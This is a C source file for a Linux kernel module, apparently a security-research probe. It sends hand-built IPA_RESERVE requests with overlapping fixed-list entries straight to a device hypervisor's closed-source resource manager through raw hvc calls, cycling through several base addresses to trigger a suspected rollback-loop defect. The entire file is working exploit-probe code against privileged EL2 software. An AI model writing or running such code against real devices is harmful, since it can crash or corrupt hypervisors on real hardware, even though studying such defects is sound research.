// gh_ipa23.c — direct MSGQ_SEND of IPA_RESERVE FIXED_LIST with overlapping
// entries to the real-device (closed-source EL2) RM, probing for the
// reserve_fixed_list rollback loop defect seen on the open-source RM.
// No kernel symbols used except printk; msg queue cap hard-coded from
// /proc/device-tree/hypervisor/qcom,resource-manager-rpc@.../reg[0].
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/delay.h>

#define MSGQ_SEND_HVC 0xc600801bUL
#define IPA_RESERVE_MSG_ID 0x560000B0U

static unsigned long tx_cap = 0x585b34c8a8358d29UL;
module_param(tx_cap, ulong, 0644);

static u8 msg[56] __aligned(8);

static void build_msg(u64 base)
{
	/* wire header (8B) */
	msg[0] = 0x21;                  /* api=1, header_words=2 */
	msg[1] = 0x01;                  /* num_fragments=0, msg_type=1 REQ */
	msg[2] = 0x01; msg[3] = 0x00;   /* seq=1 LE */
	msg[4] = (u8)(IPA_RESERVE_MSG_ID & 0xff);
	msg[5] = (u8)((IPA_RESERVE_MSG_ID >> 8) & 0xff);
	msg[6] = (u8)((IPA_RESERVE_MSG_ID >> 16) & 0xff);
	msg[7] = (u8)((IPA_RESERVE_MSG_ID >> 24) & 0xff);
	/* ipa_reserve_req_t (16B): alloc_type=0 FIXED_LIST */
	msg[8]  = 0;                    /* alloc_type */
	msg[9]  = 0;                    /* res0_0 */
	msg[10] = 0; msg[11] = 0;       /* res0_1 */
	msg[12] = 0; msg[13] = 0; msg[14] = 0; msg[15] = 0; /* generic=0 */
	msg[16] = 0; msg[17] = 0; msg[18] = 0; msg[19] = 0; /* platform=0 */
	msg[20] = 2; msg[21] = 0; msg[22] = 0; msg[23] = 0; /* entries=2 */
	/* entries (2 x 16B), both the same -> overlap on 2nd tag */
	u64 *e = (u64 *)&msg[24];
	e[0] = base; e[1] = 0x1000;      /* entry0: base, size */
	e[2] = base; e[3] = 0x1000;      /* entry1: same base (overlap) */
}

static void do_send(u64 base)
{
	build_msg(base);
	register u64 a0 __asm__("x0") = MSGQ_SEND_HVC;
	register u64 a1 __asm__("x1") = tx_cap;
	register u64 a2 __asm__("x2") = sizeof(msg);
	register u64 a3 __asm__("x3") = (u64)msg;
	register u64 a4 __asm__("x4") = 0;
	register u64 a5 __asm__("x5") = 0;
	__asm__ volatile("hvc #0"
			 : "+r"(a0)
			 : "r"(a1), "r"(a2), "r"(a3), "r"(a4), "r"(a5)
			 : "memory");
	pr_info("GHIPA23: base=%#llx MSGQ_SEND ret=%#llx\n",
		(unsigned long long)base, (unsigned long long)a0);
}

static int __init gh_ipa23_init(void)
{
	/* candidate bases: try several; first tag success + overlap -> rollback */
	u64 bases[] = { 0x80000000ULL, 0x10000000ULL, 0x40000000ULL,
			0x800000000ULL, 0x100000000ULL, 0x200000000ULL };
	int i;

	pr_info("GHIPA23: init tx_cap=%#lx\n", tx_cap);
	for (i = 0; i < ARRAY_SIZE(bases); i++)
		do_send(bases[i]);
	pr_info("GHIPA23: sent %d messages\n", i);
	return 0;
}

static void __exit gh_ipa23_exit(void) {}

module_init(gh_ipa23_init);
module_exit(gh_ipa23_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Probe real-device RM IPA_RESERVE FIXED_LIST rollback");
